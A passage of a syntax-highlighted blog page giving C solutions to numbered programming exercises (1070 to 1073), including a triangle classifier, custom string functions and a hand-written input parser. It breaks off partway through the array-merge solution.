class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_sort</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b,<span class="keyword">int</span> *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> temp;</span><br><span class="line">  <span class="keyword">if</span>(*a&gt;*b)&#123;temp=*a;*a=*b;*b=temp;&#125;</span><br><span class="line">    <span class="keyword">if</span>(*a&gt;*c)&#123;temp=*a;*a=*c;*c=temp;&#125;</span><br><span class="line">      <span class="keyword">if</span>(*b&gt;*c)&#123;temp=*b;*b=*c;*c=temp;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_triangle</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a+b&gt;c)&#123;<span class="keyword">return</span> <span class="number">1</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"not a triangle"</span>);<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">choose_angle</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(c*c-a*a-b*b&gt;<span class="number">0</span>)&#123;<span class="built_in">printf</span>(<span class="string">"obtuse "</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(c*c-a*a-b*b==<span class="number">0</span>)&#123;<span class="built_in">printf</span>(<span class="string">"right "</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="built_in">printf</span>(<span class="string">"acute "</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">choose_edge</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a!=b&amp;&amp;b!=c)&#123;<span class="built_in">printf</span>(<span class="string">"scalene"</span>);<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span>(a==b&amp;&amp;b==c)&#123;<span class="built_in">printf</span>(<span class="string">"equilateral"</span>);<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span>(a==b||b==c)&#123;<span class="built_in">printf</span>(<span class="string">"isosceles"</span>);<span class="keyword">return</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,c;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;a,&amp;b,&amp;c)==<span class="number">3</span>)&#123;</span><br><span class="line">        my_sort(&amp;a,&amp;b,&amp;c);<span class="comment">//按非递减排序</span></span><br><span class="line">        <span class="keyword">if</span>(is_triangle(a,b,c))&#123;<span class="comment">//判断是否构成三角形</span></span><br><span class="line">        choose_angle(a,b,c);<span class="comment">//按最大角类型分类</span></span><br><span class="line">        choose_edge(a,b,c);<span class="comment">//按照边长类型分类</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1071字符串串烧"><a href="#1071字符串串烧" class="headerlink" title="1071字符串串烧"></a>1071字符串串烧</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 210</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getnchar</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;n<span class="number">-1</span>;)</span><br><span class="line">    &#123;</span><br><span class="line">        str[i]=getchar();</span><br><span class="line">        <span class="keyword">if</span>(str[i]==<span class="string">'\n'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    str[i]=<span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_strlen</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(str[len]!=<span class="string">'\0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_strncat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">char</span> *src, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=my_strlen(dest),j=my_strlen(src),k;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;j&amp;&amp;k&lt;n; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dest[i+k]=src[k];</span><br><span class="line">    &#125;</span><br><span class="line">    dest[i+k]=<span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_strspn</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">char</span> *keys)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j;</span><br><span class="line">    <span class="keyword">while</span>(str[i]!=<span class="string">'\0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(keys[j]!=<span class="string">'\0'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(keys[j]==str[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(keys[j]==<span class="string">'\0'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nCase,x;</span><br><span class="line">    <span class="keyword">char</span> a[N],b[N],c[N];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;nCase);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">while</span>(nCase--)</span><br><span class="line">    &#123;</span><br><span class="line">        getnchar(a,N);</span><br><span class="line">        getnchar(b,N);</span><br><span class="line">        getnchar(c,N);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,my_strlen(a));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d %s\n"</span>,my_strncat(a,b,x),a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,my_strspn(b,c));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1072石敢腐"><a href="#1072石敢腐" class="headerlink" title="1072石敢腐"></a>1072石敢腐</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> D debug();</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> E debug1();</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_space</span><span class="params">()</span><span class="comment">//取走所有空白字符</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp=getchar();</span><br><span class="line">        <span class="keyword">if</span>(temp==<span class="string">' '</span>||temp==<span class="string">'\t'</span>||temp==<span class="string">'\n'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ungetc(temp,<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"I am here\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"#\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shiganfu</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format, <span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *a,b;</span><br><span class="line">    <span class="keyword">int</span> temp,i,j,k;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(format,<span class="string">"%d"</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        get_space();</span><br><span class="line">        b=getchar();</span><br><span class="line">        <span class="keyword">if</span>(b==EOF)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(b&lt;<span class="string">'0'</span>||b&gt;<span class="string">'9'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ungetc(b,<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ungetc(b,<span class="built_in">stdin</span>);</span><br><span class="line">        i=temp=<span class="number">0</span>;</span><br><span class="line">        a=(<span class="keyword">char</span> *)ptr;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a[i]=getchar();</span><br><span class="line">            <span class="keyword">if</span>(a[i]&lt;<span class="string">'0'</span>||a[i]&gt;<span class="string">'9'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]!=EOF)</span><br><span class="line">                &#123;</span><br><span class="line">                    ungetc(a[i],<span class="built_in">stdin</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(j=<span class="number">1</span>,i--; i&gt;<span class="number">-1</span>; i--)</span><br><span class="line">                &#123;</span><br><span class="line">                    temp=temp+j*(a[i]-<span class="string">'0'</span>);</span><br><span class="line">                    j*=<span class="number">10</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                *(<span class="keyword">int</span> *)ptr=temp;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(format,<span class="string">"%c"</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        getchar();</span><br><span class="line">        b=getchar();</span><br><span class="line">        <span class="keyword">if</span>(b==EOF)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *(<span class="keyword">char</span>*)ptr=b;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(format,<span class="string">"%s"</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        get_space();</span><br><span class="line">        b=getchar();</span><br><span class="line">        <span class="keyword">if</span>((b)==EOF)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ungetc(b,<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        a=(<span class="keyword">char</span> *)ptr;</span><br><span class="line">        i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a[i]=getchar();</span><br><span class="line">            <span class="keyword">if</span>(a[i]==<span class="string">' '</span>||a[i]==<span class="string">'\t'</span>||a[i]==<span class="string">'\n'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ungetc(a[i],<span class="built_in">stdin</span>);</span><br><span class="line">                a[i]=<span class="string">'\0'</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(a[i]==EOF)</span><br><span class="line">            &#123;</span><br><span class="line">                a[i]=<span class="string">'\0'</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(format,<span class="string">"\\n"</span>)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            b=getchar();</span><br><span class="line">            <span class="keyword">if</span>(b==<span class="string">' '</span>||b==<span class="string">'\t'</span>||b==<span class="string">'\n'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>  <span class="keyword">if</span>(b==EOF)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ungetc(b,<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//    char s,t,r;while(1)&#123;</span></span><br><span class="line"><span class="comment">//    s=getchar();printf("%c**HAHA!1\n",s);</span></span><br><span class="line"><span class="comment">//    t=getchar();printf("%c**HAHA!2\n",t);</span></span><br><span class="line"><span class="comment">//    r=getchar();printf("%d**HAHA!3\n",r);</span></span><br><span class="line"><span class="comment">//    if(s==EOF)&#123;printf("%d**HAHA!4\n",s);&#125;</span></span><br><span class="line"><span class="comment">//               getchar(); printf("HAHA5!\n");&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">////测试ctrl+z的问题</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *ptr=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*N);</span><br><span class="line">    <span class="keyword">char</span> format[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i,ret;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        get_space();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        i=0;</span></span><br><span class="line"><span class="comment">//        while(1)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            format[i]=getchar();</span></span><br><span class="line"><span class="comment">//            if(format[i]==' '||i==2)</span></span><br><span class="line"><span class="comment">//            &#123;</span></span><br><span class="line"><span class="comment">//                format[i]='\0';</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//            else</span></span><br><span class="line"><span class="comment">//            &#123;</span></span><br><span class="line"><span class="comment">//                i++;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">// //puts(format);</span></span><br><span class="line">        format[<span class="number">0</span>]=getchar();</span><br><span class="line">        <span class="keyword">if</span>(format[<span class="number">0</span>]==EOF)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            format[<span class="number">1</span>]=getchar();</span><br><span class="line">            format[<span class="number">2</span>]=<span class="string">'\0'</span>;</span><br><span class="line">            ret=<span class="number">-10</span>;</span><br><span class="line">            ret=shiganfu(format,ptr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>,ret);</span><br><span class="line">            <span class="keyword">if</span>(ret==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">strcmp</span>(format,<span class="string">"%s"</span>)==<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" %s"</span>,(<span class="keyword">char</span>*)ptr);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(format,<span class="string">"%d"</span>)==<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" %d"</span>,*(<span class="keyword">int</span>*)ptr);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(format,<span class="string">"%c"</span>)==<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" %c"</span>,*(<span class="keyword">char</span>*)ptr);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1073合并有序数组"><a href="#1073合并有序数组" class="headerlink" title="1073合并有序数组"></a>1073合并有序数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1000000</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> s,t,i,j;</span><br><span class="line">    <span class="keyword">int</span> a[N];</span><br><span class="line">    <span class="keyword">int</span> b[N];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;a[i]=b[i]=<span class="number">0</span>;&#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">while</span>(n--&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;s);</span><br><span class="line">        <span class="keyword">for</span>(i=<span 